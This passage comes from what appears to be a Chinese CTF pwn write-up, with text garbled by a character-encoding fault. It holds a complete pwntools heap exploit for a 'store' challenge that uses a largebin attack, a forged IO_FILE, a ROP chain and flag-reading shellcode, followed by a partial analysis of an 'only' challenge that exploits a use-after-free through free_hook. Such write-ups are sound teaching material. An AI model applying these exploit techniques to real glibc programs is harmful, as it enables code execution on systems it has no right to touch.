class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">arch = <span class="number">64</span></span><br><span class="line">challenge = <span class="string">&#x27;./store&#x27;</span></span><br><span class="line"></span><br><span class="line">context.os=<span class="string">&#x27;linux&#x27;</span></span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"><span class="keyword">if</span> arch==<span class="number">64</span>:</span><br><span class="line">    context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="keyword">if</span> arch==<span class="number">32</span>:</span><br><span class="line">    context.arch=<span class="string">&#x27;i386&#x27;</span></span><br><span class="line"></span><br><span class="line">elf = ELF(challenge)</span><br><span class="line">libc = ELF(<span class="string">&#x27;libc-2.31.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    p = process(challenge)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;172.51.221.20&#x27;</span>,<span class="string">&#x27;9999&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span>():</span></span><br><span class="line">    gdb.attach(p,<span class="string">&quot;set debug-file-directory ./debug\n&quot;</span>)</span><br><span class="line">    <span class="comment">#gdb.attach(p,&quot;b *$rebase(0x1B0A)\n&quot;)</span></span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">choice</span>(<span class="params">ch</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&quot;choice: &quot;</span>,<span class="built_in">str</span>(ch))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size,content,remark</span>):</span></span><br><span class="line">    choice(<span class="number">1</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Size: &quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Content:&quot;</span>,<span class="built_in">str</span>(content))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Remark:&quot;</span>,<span class="built_in">str</span>(remark))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add2</span>(<span class="params">size</span>):</span></span><br><span class="line">    choice(<span class="number">1</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Size: &quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dele</span>(<span class="params">index</span>):</span></span><br><span class="line">    choice(<span class="number">2</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Index: &quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">index,content,remark</span>):</span></span><br><span class="line">    choice(<span class="number">3</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Index: &quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    p.sendafter(<span class="string">&quot;Content:&quot;</span>,<span class="built_in">str</span>(content))</span><br><span class="line">    p.sendafter(<span class="string">&quot;Remark:&quot;</span>,<span class="built_in">str</span>(remark))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">index</span>):</span></span><br><span class="line">    choice(<span class="number">4</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Index: &quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line">add(<span class="number">0x450</span>,<span class="string">&quot;a&quot;</span>*<span class="number">0x10</span>,<span class="string">&quot;a&quot;</span>*<span class="number">0x10</span>) <span class="comment"># unsortedbin</span></span><br><span class="line">add(<span class="number">0x460</span>,<span class="string">&quot;a&quot;</span>*<span class="number">0x10</span>,<span class="string">&quot;&quot;</span>) <span class="comment"># largebin</span></span><br><span class="line">dele(<span class="number">1</span>)</span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;Content: \n&quot;</span>)</span><br><span class="line">leak_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&quot;\x00&quot;</span>))</span><br><span class="line">libc_base = leak_addr - <span class="number">0x1ecbe0</span></span><br><span class="line">success(<span class="string">&quot;leak_addr &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(leak_addr))</span><br><span class="line">success(<span class="string">&quot;libc_base &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">add2(<span class="number">0x500</span>)</span><br><span class="line">dele(<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">1</span>,<span class="string">&quot;b&quot;</span>*<span class="number">0x18</span>,<span class="string">&quot;b&quot;</span>*<span class="number">0x18</span>)</span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;b&quot;</span>*<span class="number">0x18</span>)</span><br><span class="line">leak_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&quot;\x00&quot;</span>))</span><br><span class="line">heap_base = leak_addr - <span class="number">0xb50</span> </span><br><span class="line">success(<span class="string">&quot;leak_addr &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(leak_addr))</span><br><span class="line">success(<span class="string">&quot;heap_base &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(heap_base))</span><br><span class="line"></span><br><span class="line">free_hook = libc_base + libc.sym[<span class="string">&quot;__free_hook&quot;</span>]</span><br><span class="line">setcontext = libc_base + libc.sym[<span class="string">&quot;setcontext&quot;</span>]</span><br><span class="line">_IO_list_all = libc_base + libc.sym[<span class="string">&#x27;_IO_list_all&#x27;</span>]</span><br><span class="line">mprotect = libc_base + libc.sym[<span class="string">&#x27;mprotect&#x27;</span>]</span><br><span class="line">_IO_wfile_jumps= libc_base + libc.sym[<span class="string">&#x27;_IO_wfile_jumps&#x27;</span>]</span><br><span class="line">success(<span class="string">&quot;_IO_list_all &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(_IO_list_all))</span><br><span class="line">success(<span class="string">&quot;setcontext+61 &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(setcontext+<span class="number">61</span>))</span><br><span class="line"></span><br><span class="line">pop_rdi_ret = <span class="number">0x0000000000023b6a</span> + libc_base</span><br><span class="line">pop_rsi_ret = <span class="number">0x000000000002601f</span> + libc_base</span><br><span class="line">pop_rdx_ret = <span class="number">0x0000000000142c92</span> + libc_base</span><br><span class="line">ret = <span class="number">0x0000000000022679</span> + libc_base</span><br><span class="line"></span><br><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">3</span>  + p64(_IO_list_all-<span class="number">0x20</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">1</span>,payload,<span class="string">&quot;b&quot;</span>*<span class="number">0x10</span>)</span><br><span class="line">add2(<span class="number">0x500</span>)</span><br><span class="line"></span><br><span class="line">shellcode = asm(</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    mov rax, 0xc0</span></span><br><span class="line"><span class="string">    mov rbx, 0x500000</span></span><br><span class="line"><span class="string">    mov rcx, 0x5000</span></span><br><span class="line"><span class="string">    mov rdx, 3</span></span><br><span class="line"><span class="string">    mov rsi, 1048610</span></span><br><span class="line"><span class="string">    xor rdi, rdi</span></span><br><span class="line"><span class="string">    xor rbp, rbp</span></span><br><span class="line"><span class="string">    int 0x80</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    mov rdi, 0</span></span><br><span class="line"><span class="string">    mov rsi, 0x502000</span></span><br><span class="line"><span class="string">    mov rdx, 0x100</span></span><br><span class="line"><span class="string">    xor rax, rax</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    mov rax, 5</span></span><br><span class="line"><span class="string">    mov rbx, 0x502000</span></span><br><span class="line"><span class="string">    xor rcx, rcx</span></span><br><span class="line"><span class="string">    xor rdx, rdx</span></span><br><span class="line"><span class="string">    int 0x80</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    mov rdi, rax</span></span><br><span class="line"><span class="string">    mov rsi, rsp</span></span><br><span class="line"><span class="string">    mov rdx, 0x100</span></span><br><span class="line"><span class="string">    xor rax, rax</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    mov rdi, 1</span></span><br><span class="line"><span class="string">    mov rax, 1</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">shellcode = asm(</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    mov rax, 0xc0</span></span><br><span class="line"><span class="string">    mov rbx, 0x500000</span></span><br><span class="line"><span class="string">    mov rcx, 0x5000</span></span><br><span class="line"><span class="string">    mov rdx, 3</span></span><br><span class="line"><span class="string">    mov rsi, 1048610</span></span><br><span class="line"><span class="string">    xor rdi, rdi</span></span><br><span class="line"><span class="string">    xor rbp, rbp</span></span><br><span class="line"><span class="string">    int 0x80</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    mov rdi, 0</span></span><br><span class="line"><span class="string">    mov rsi, 0x502000</span></span><br><span class="line"><span class="string">    mov rdx, 0x100</span></span><br><span class="line"><span class="string">    xor rax, rax</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    mov rax, 5</span></span><br><span class="line"><span class="string">    mov rbx, 0x502000</span></span><br><span class="line"><span class="string">    xor rcx, rcx</span></span><br><span class="line"><span class="string">    xor rdx, rdx</span></span><br><span class="line"><span class="string">    int 0x80</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    mov rax, 0x8d</span></span><br><span class="line"><span class="string">    mov rbx, 3</span></span><br><span class="line"><span class="string">    mov rcx, 0x502000</span></span><br><span class="line"><span class="string">    mov rdx, 0x200</span></span><br><span class="line"><span class="string">    int 0x80</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    mov rdi, 1</span></span><br><span class="line"><span class="string">    mov rax, 1</span></span><br><span class="line"><span class="string">    mov rsi ,0x502000</span></span><br><span class="line"><span class="string">    mov rdx ,0x200</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;, arch=&#x27;amd64&#x27;)</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">next_chain = <span class="number">0</span></span><br><span class="line">fake_io_addr = heap_base + <span class="number">0x290</span></span><br><span class="line">shellcode_addr = heap_base + <span class="number">0x750</span></span><br><span class="line">payload_addr = heap_base + <span class="number">0x700</span></span><br><span class="line">flag_addr = heap_base+<span class="number">0x1000</span></span><br><span class="line"></span><br><span class="line">payload =  p64(payload_addr+<span class="number">0x10</span>) + p64(ret)</span><br><span class="line">payload += p64(pop_rdi_ret) + p64(heap_base)</span><br><span class="line">payload += p64(pop_rsi_ret) + p64(<span class="number">0x7000</span>)</span><br><span class="line">payload += p64(pop_rdx_ret) + p64(<span class="number">7</span>)</span><br><span class="line">payload += p64(mprotect) + p64(shellcode_addr)</span><br><span class="line">payload += shellcode</span><br><span class="line"></span><br><span class="line">fake_IO_FILE =  p64(<span class="number">0</span>)         <span class="comment">#_flags=rdi</span></span><br><span class="line">fake_IO_FILE += p64(<span class="number">0</span>)*<span class="number">5</span></span><br><span class="line">fake_IO_FILE += p64(<span class="number">1</span>)+p64(<span class="number">2</span>) <span class="comment"># rcx!=0(FSOP)</span></span><br><span class="line">fake_IO_FILE += p64(payload_addr-<span class="number">0xa0</span>)<span class="comment">#_IO_backup_base=rdx</span></span><br><span class="line">fake_IO_FILE += p64(setcontext+<span class="number">61</span>)<span class="comment">#_IO_save_end=call addr(call setcontext/system)</span></span><br><span class="line">fake_IO_FILE =  fake_IO_FILE.ljust(<span class="number">0x58</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(<span class="number">0</span>)  <span class="comment"># _chain</span></span><br><span class="line">fake_IO_FILE =  fake_IO_FILE.ljust(<span class="number">0x78</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(flag_addr)  <span class="comment"># _lock = a writable address</span></span><br><span class="line">fake_IO_FILE =  fake_IO_FILE.ljust(<span class="number">0x90</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(fake_io_addr+<span class="number">0x30</span>)<span class="comment">#_wide_data,rax1_addr</span></span><br><span class="line">fake_IO_FILE =  fake_IO_FILE.ljust(<span class="number">0xb0</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(<span class="number">1</span>) <span class="comment">#mode=1</span></span><br><span class="line">fake_IO_FILE =  fake_IO_FILE.ljust(<span class="number">0xc8</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(_IO_wfile_jumps+<span class="number">0x30</span>)  <span class="comment"># vtable=IO_wfile_jumps+0x10</span></span><br><span class="line">fake_IO_FILE += p64(<span class="number">0</span>)*<span class="number">6</span></span><br><span class="line">fake_IO_FILE += p64(fake_io_addr+<span class="number">0x40</span>)  <span class="comment"># rax2_addr</span></span><br><span class="line">edit(<span class="number">0</span>,fake_IO_FILE,payload)</span><br><span class="line"></span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line">choice(<span class="number">5</span>)</span><br><span class="line">p.send(<span class="string">&#x27;flag&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="only"><a href="#only" class="headerlink" title="only"></a>only</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">GNU C <span class="title">Library</span> <span class="params">(Ubuntu GLIBC <span class="number">2.31</span><span class="number">-0u</span>buntu9<span class="number">.2</span>)</span> stable release version 2.31.\n</span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">only: ELF <span class="number">64</span>-bit LSB shared object, x86<span class="number">-64</span>, version <span class="number">1</span> (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86<span class="number">-64.</span>so<span class="number">.2</span>, BuildID[sha1]=<span class="number">26f</span>d95677098954c2c6ee0e7543a029459dc6f97, <span class="keyword">for</span> GNU/Linux <span class="number">3.2</span><span class="number">.0</span>, stripped</span><br><span class="line">    Arch:     amd64<span class="number">-64</span>-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure>
<ul>
<li>64‰ΩçÔºådynamicallyÔºåÂÖ®ÂºÄ</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0000</span>: <span class="number">0x20</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000004</span>  A = arch</span><br><span class="line"><span class="number">0001</span>: <span class="number">0x15</span> <span class="number">0x00</span> <span class="number">0x05</span> <span class="number">0xc000003e</span>  <span class="keyword">if</span> (A != ARCH_X86_64) <span class="keyword">goto</span> <span class="number">0007</span></span><br><span class="line"><span class="number">0002</span>: <span class="number">0x20</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000000</span>  A = sys_number</span><br><span class="line"><span class="number">0003</span>: <span class="number">0x35</span> <span class="number">0x00</span> <span class="number">0x01</span> <span class="number">0x40000000</span>  <span class="keyword">if</span> (A &lt; <span class="number">0x40000000</span>) <span class="keyword">goto</span> <span class="number">0005</span></span><br><span class="line"><span class="number">0004</span>: <span class="number">0x15</span> <span class="number">0x00</span> <span class="number">0x02</span> <span class="number">0xffffffff</span>  <span class="keyword">if</span> (A != <span class="number">0xffffffff</span>) <span class="keyword">goto</span> <span class="number">0007</span></span><br><span class="line"><span class="number">0005</span>: <span class="number">0x15</span> <span class="number">0x01</span> <span class="number">0x00</span> <span class="number">0x0000003b</span>  <span class="keyword">if</span> (A == execve) <span class="keyword">goto</span> <span class="number">0007</span></span><br><span class="line"><span class="number">0006</span>: <span class="number">0x06</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x7fff0000</span>  <span class="keyword">return</span> ALLOW</span><br><span class="line"><span class="number">0007</span>: <span class="number">0x06</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000000</span>  <span class="keyword">return</span> KILL</span><br></pre></td></tr></table></figure>
<p><strong>ÊºèÊ¥ûÂàÜÊûê</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 <span class="title">dele</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> __int64 canary; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  canary = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( !free_num )                            </span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  <span class="built_in">free</span>(chunk);                                </span><br><span class="line">  --free_num;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Done!&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ canary;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>Êúâ‰∏™ UAFÔºå‰ΩÜÊòØ 2.31 ÁâàÊú¨ÁöÑ libc Êúâ tcache keyÔºå‰∏çËÉΩÁõ¥Êé•Âà©Áî®</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 <span class="title">fill</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> size; <span class="comment">// [rsp+4h] [rbp-Ch]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 canary; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  canary = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( fill_key == <span class="number">0xDEADBEEF</span> )                 <span class="comment">// ÈôêÂà∂‰∏ÄÊ¨°</span></span><br><span class="line">  &#123;</span><br><span class="line">    fill_key = <span class="number">0</span>;</span><br><span class="line">    size = <span class="number">0x10</span>;</span><br><span class="line">    <span class="keyword">if</span> ( !chunk )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;Size:&quot;</span>);</span><br><span class="line">      size = input_num();</span><br><span class="line">      <span class="keyword">if</span> ( size &lt;= <span class="number">0</span> || size &gt; <span class="number">0xE7</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Error&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      chunk = <span class="built_in">malloc</span>(size);</span><br><span class="line">      <span class="keyword">if</span> ( !chunk )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Error&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">memset</span>(chunk, <span class="number">0</span>, size);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ canary;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>Ëøô‰∏™ÂáΩÊï∞ÂèØ‰ª•ÁΩÆÁ©∫ tcache keyÔºå‰ΩÜÂè™ËÉΩÊâßË°å‰∏ÄÊ¨°</li>
</ul>
<p><strong>ÂÖ•‰æµÊÄùË∑Ø</strong></p>
<p>Á®ãÂ∫èÊã•Êúâ‰∏ÄÊ¨°‰ªªÊÑèÂÜôÁöÑÊú∫‰ºöÔºå‰ΩÜÊòØÊ≤°ÊúâÊ≥ÑÈú≤ÔºåÂØπ‰∫éËøôÁßçË¶ÅÁàÜÁ†¥ÁöÑÁ®ãÂ∫èÔºåÂª∫ËÆÆÂÖàÂÖ≥Âú∞ÂùÄÈöèÊú∫ÂåñÔºö</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo <span class="number">0</span> &gt; /proc/sys/kernel/randomize_va_space </span><br></pre></td></tr></table></figure>
<p>Âè™ËÉΩÂÖàÊâì stdout Ê≥ÑÈú≤ libcÔºåÊÄùË∑ØÂ¶Ç‰∏ãÔºö</p>
<ul>
<li>ÂÖàÂà©Áî® double free Èîô‰ΩçÂÜô‰∏Ä‰∏™ free tcache</li>
<li>‰º™ÈÄ†ÂÆÉÁöÑ presizeÔºåsize(ËæÉÂ§ßÂÄº)ÔºåFD(Ë¶ÜÁõñ‰Ωé‰Ωç)</li>
<li>ÊääÂÆÉÁî≥ËØ∑Âá∫Êù•ÁÑ∂ÂêéÈáäÊîæÔºåÂ∞±ÂèØ‰ª•ÂæóÂà∞ unsorted chunk</li>
<li>ÂÖàÁî≥ËØ∑‰∏ÄÊ¨° unsorted chunkÔºåÂπ∂Â∞Ü main_arena Ë¶ÜÁõñ‰∏∫ stdout </li>
<li>Â¶ÇÊûúÂ†ÜÈ£éÊ∞¥Â§üÂ•ΩÁöÑËØùÔºåÂ∞±‰ºöÂèëÁé∞ stdout Âú® tcache[0x70] ‰∏≠ÔºàÊúÄÂ•ΩÊòØËøôÁßçÊÉÖÂÜµÔºåÊàë‰πüÂ∞ùËØïËøáÁî® unsorted chunk Êù•Ë¶ÜÁõñÂÖ∂‰ªñÁöÑ free tcacheÔºåÁªìÊûúÊÄªÊòØË∂ÖÂá∫‚ÄúÁî≥ËØ∑Ê®°Âùó‚ÄùÁöÑÊ¨°Êï∞ÈôêÂà∂Ôºâ</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x70</span> [  <span class="number">6</span>]: <span class="number">0x55555555b800</span> ‚Äî‚ñ∏ <span class="number">0x7ffff7f896a0</span> (_IO_2_1_stdout_) ‚óÇ‚Äî <span class="number">0xfbad2887</span></span><br><span class="line"><span class="number">0x80</span> [  <span class="number">5</span>]: <span class="number">0x55555555b870</span> ‚Äî‚ñ∏ <span class="number">0x55555555b980</span> ‚Äî‚ñ∏ <span class="number">0x55555555bc10</span> ‚Äî‚ñ∏ <span class="number">0x55555555bec0</span> ‚Äî‚ñ∏ <span class="number">0x55555555ba90</span> ‚óÇ‚Äî <span class="number">0x0</span></span><br></pre></td></tr></table></figure>
<p>ÂÆåÊàêÊ≥ÑÈú≤‰ª•ÂêéÔºåÂ∞±ÂèØ‰ª•Âà©Áî®Áé∞ÊàêÁöÑ unsorted chunk Êù•‰øÆÊîπ‰∏éÂÖ∂ÈáçÂè†ÁöÑ free tcacheÔºåÊää free_hook ÂÜôÂÖ•Âà∞ tcachebin ‰∏≠</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x80</span> [  <span class="number">5</span>]: <span class="number">0x55555555b870</span> ‚Äî‚ñ∏ <span class="number">0x7ffff7f8bb28</span> (__free_hook) ‚óÇ‚Äî <span class="number">0x0</span></span><br></pre></td></tr></table></figure>
<p>ÊúÄÂêéÂ∞±ÊòØ‰∏Ä‰∏™Â†Ü‰∏ä ORW ÁöÑËøáÁ®ã‰∫ÜÔºåÂõ†‰∏∫Ê≤°ÊúâÊ≥ÑÈú≤Â†ÜÂú∞ÂùÄÔºåÊâÄ‰ª•Â∏∏ËßÑÁöÑ <code>setcontext+61</code> Âíå <code>libc.sym[&#39;svcudp_reply&#39;]+26</code> ÈÉΩÊ≤°Êúâ‰ΩúÁî®ÔºåÂè™ËÉΩÁî®ÁâπÊÆäÁöÑ magic gadget Êù•ËøõË°åÊ†àËøÅÁßª</p>
<p>Êàë‰ª¨ÂÖàÂú® <code>free_hook</code> ÁöÑ‰ΩçÁΩÆÂÜô‰∏Ä‰∏™ <code>puts</code>ÔºåÁÑ∂ÂêéÂàÜÊûêÂØÑÂ≠òÂô®ÁöÑÂÄºÔºö</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">*RAX  <span class="number">0x7ffff7e245a0</span> (<span class="built_in">puts</span>) ‚óÇ‚Äî endbr64 </span><br><span class="line"> RBX  <span class="number">0x555555555950</span> ‚óÇ‚Äî endbr64 </span><br><span class="line">*RCX  <span class="number">0x0</span></span><br><span class="line">*RDX  <span class="number">0xfffffffffffffffe</span></span><br><span class="line">*RDI  <span class="number">0x7ffff7f8bb28</span> (__free_hook) ‚Äî‚ñ∏ <span class="number">0x7ffff7e245a0</span> (<span class="built_in">puts</span>) ‚óÇ‚Äî endbr64 </span><br><span class="line">*RSI  <span class="number">0x555555555778</span> ‚óÇ‚Äî lea    rax, [rip + <span class="number">0x2899</span>]</span><br><span class="line">*R8   <span class="number">0x1999999999999999</span></span><br><span class="line">*R9   <span class="number">0x0</span></span><br><span class="line">*R10  <span class="number">0x7ffff7f3bac0</span> (_nl_C_LC_CTYPE_toupper+<span class="number">512</span>) ‚óÇ‚Äî <span class="number">0x100000000</span></span><br><span class="line">*R11  <span class="number">0x7ffff7f3c3c0</span> (_nl_C_LC_CTYPE_class+<span class="number">256</span>) ‚óÇ‚Äî <span class="number">0x2000200020002</span></span><br><span class="line"> R12  <span class="number">0x555555555240</span> ‚óÇ‚Äî endbr64 </span><br><span class="line"> R13  <span class="number">0x7fffffffdf50</span> ‚óÇ‚Äî <span class="number">0x1</span></span><br><span class="line"> R14  <span class="number">0x0</span></span><br><span class="line"> R15  <span class="number">0x0</span></span><br><span class="line">*RBP  <span class="number">0x7fffffffde40</span> ‚Äî‚ñ∏ <span class="number">0x7fffffffde60</span> ‚óÇ‚Äî <span class="number">0x0</span></span><br><span class="line">*RSP  <span class="number">0x7fffffffde28</span> ‚Äî‚ñ∏ <span class="number">0x555555555778</span> ‚óÇ‚Äî lea    rax, [rip + <span class="number">0x2899</span>]</span><br><span class="line">*RIP  <span class="number">0x7ffff7e245a0</span> (<span class="built_in">puts</span>) ‚óÇ‚Äî endbr64 </span><br></pre></td></tr></table></figure>
<ul>
<li>Âè™Êúâ RDI ÂØÑÂ≠òÂô®ÂèØ‰ª•Âà©Áî®</li>
<li>Âõ†Ê≠§Êàë‰ª¨Ë¶ÅÊää ORW ÈìæÂÜôÂÖ• <code>free_hook</code>ÔºåÁÑ∂ÂêéÂà©Áî® RDI ÂØÑÂ≠òÂô®Êù•ËøõË°åÊ†àËøÅÁßª</li>
